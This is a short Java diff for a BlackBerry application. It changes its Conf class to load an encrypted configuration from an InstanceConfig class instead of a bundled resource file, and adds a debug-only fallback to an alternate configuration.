@@ -17,6 +17,8 @@ import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.action.Action;
 import blackberry.agent.Agent;
+import blackberry.config.InstanceConfig;
+import blackberry.config.InstanceKeys;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.event.Event;
@@ -203,13 +205,19 @@ public final class Conf {
         debug.warn("Reading Conf from resourses");
         //#endif
 
-        final InputStream i0 = Conf.class
-                .getResourceAsStream("config/config.bin");
-        if (i0 != null) {
+        InputStream inputStream = InstanceConfig.getConfig();
+        if (inputStream != null) {
             //#ifdef DBC
-            Check.asserts(i0 != null, "Resource config");
+            Check.asserts(inputStream != null, "Resource config");
             //#endif            
-            ret = loadCyphered(i0, confKey);
+            ret = loadCyphered(inputStream, confKey);
+
+            //#ifdef DEBUG
+            if (ret == false) {
+                inputStream = InstanceConfig.getConfig323();
+                ret = loadCyphered(inputStream, confKey);
+            }
+            //#endif
 
         } else {
             //#ifdef DEBUG
@@ -217,7 +225,6 @@ public final class Conf {
             //#endif
             ret = false;
         }
-
         return ret;
     }
 
